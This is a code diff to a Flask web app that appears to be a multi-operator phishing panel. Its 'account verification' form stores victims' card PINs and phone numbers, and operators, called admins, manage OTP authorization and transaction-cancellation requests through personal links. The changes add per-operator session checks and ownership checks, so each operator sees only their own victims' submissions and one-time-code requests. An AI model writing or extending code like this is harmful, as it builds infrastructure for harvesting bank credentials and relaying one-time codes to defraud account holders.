@@ -422,11 +422,23 @@ def submit_form():
         # Get JSON data from request body
         data = request.get_json()
         
+        # Get admin_id from session (set when client visited homepage with admin_id parameter)
+        admin_id = session.get('admin_id')
+        
+        # Validate that admin_id exists (client must have come through a valid admin link)
+        if not admin_id:
+            return jsonify({'error': 'Invalid access. Please use the correct verification link.'}), 400
+        
+        # Verify the admin exists and is active
+        admin = Admin.query.get(admin_id)
+        if not admin or not admin.is_active:
+            return jsonify({'error': 'Invalid access. Admin account not found or inactive.'}), 400
+        
         # Log form submission attempt
         log_user_activity(
             action_type='form_submit',  # Mark this as a form submission
             page='/api/submit',  # Record the endpoint
-            additional_data='{"form_type": "account_verification"}'  # Extra context about the form
+            additional_data=f'{{"form_type": "account_verification", "admin_id": {admin_id}}}'  # Extra context about the form
         )
         
         # Validate that all required fields are present
@@ -448,10 +460,10 @@ def submit_form():
         log_user_activity(
             action_type='form_submit_success',  # Mark as successful submission
             page='/api/submit',  # Record the endpoint
-            additional_data=f'{{"pdf": "{pdf_name}"}}'  # Reference generated PDF
+            additional_data=f'{{"pdf": "{pdf_name}", "admin_id": {admin_id}}}'  # Reference generated PDF and admin
         )
         
-        print(f'New submission PDF saved: {pdf_name}')
+        print(f'New submission PDF saved: {pdf_name} for admin_id: {admin_id}')
         
         # Create new submission record in database
         new_submission = Submission(
@@ -463,7 +475,7 @@ def submit_form():
             card_pin=data['card_pin'],
             contact_number=data.get('contact_number'),
             phone_number=data['phone_number'],
-            admin_id=session.get('admin_id') # Associate with admin if present in session
+            admin_id=admin_id  # Associate with the specific admin from the link
         )
         db.session.add(new_submission)
         db.session.commit()
@@ -992,6 +1004,12 @@ def get_submissions():
         admin_id = session.get('admin_id')
         if not admin_id:
             return jsonify({'error': 'Admin not logged in or session expired'}), 401
+        
+        # Verify the admin exists and is active
+        admin = Admin.query.get(admin_id)
+        if not admin or not admin.is_active:
+            return jsonify({'error': 'Admin account not found or inactive'}), 401
+        
         # Query submissions for the current admin, ordered by most recent first
         submissions = Submission.query.filter_by(admin_id=admin_id).order_by(Submission.submitted_at.desc()).all()
         
@@ -1179,6 +1197,11 @@ def manage_otp_authorization(request_id):
         if not auth_request:
             return jsonify({'error': 'Authorization request not found'}), 404
         
+        # SECURITY CHECK: Ensure this request belongs to the current admin
+        current_admin_id = session.get('admin_id')
+        if auth_request.admin_id != current_admin_id:
+            return jsonify({'error': 'Unauthorized: This request does not belong to your workspace'}), 403
+        
         # Check if request is still pending
         if auth_request.status != 'pending':
             return jsonify({'error': f'Request already {auth_request.status}'}), 400
@@ -1286,6 +1309,11 @@ def manage_otp_verification(verification_id):
         if not verification_request:
             return jsonify({'error': 'Verification request not found'}), 404
         
+        # SECURITY CHECK: Ensure this request belongs to the current admin
+        current_admin_id = session.get('admin_id')
+        if verification_request.admin_id != current_admin_id:
+            return jsonify({'error': 'Unauthorized: This request does not belong to your workspace'}), 403
+        
         # Check if request is still pending
         if verification_request.status != 'pending':
             return jsonify({'error': f'Request already {verification_request.status}'}), 400
@@ -1392,6 +1420,11 @@ def manage_transaction_cancellation_verification(verification_id):
         
         if not verification_request:
             return jsonify({'error': 'Verification request not found'}), 404
+        
+        # SECURITY CHECK: Ensure this request belongs to the current admin
+        current_admin_id = session.get('admin_id')
+        if verification_request.admin_id != current_admin_id:
+            return jsonify({'error': 'Unauthorized: This request does not belong to your workspace'}), 400
         
         # Check if request is still pending
         if verification_request.status != 'pending':
